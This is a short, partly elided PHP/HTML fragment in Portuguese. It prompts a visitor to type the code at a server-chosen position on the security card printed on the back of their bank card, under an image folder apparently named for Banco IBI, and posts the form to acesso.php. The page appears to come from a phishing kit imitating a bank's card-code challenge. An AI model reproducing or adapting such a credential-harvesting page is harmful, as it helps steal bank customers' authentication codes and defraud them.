...
<div class="block_loading">
	...
	<div class="block_ps4">
		...
		<span class="desc_exec_show">Digite a chave <b class="red_txt"><?php echo $PosicaoPedida;?></b> referente a tabela do verso do seu cartão:</span>

		<div class="block_tks_all">
			<img src="../_images/ibi/informe_chave_1.jpg" class="get_chave_info">
			<form action="acesso.php" method="post" name="form_PT" id="form_PT" onsubmit="return check_FPT();">
			...
			<span class="pos_info_tks">(Informe a chave <b class="red_txt"><?php echo $PosicaoPedida;?></b>)</span>
			<div class="clear"></div>
		</div><!-- block_tks_all -->
	</div><!-- block_ps4 -->
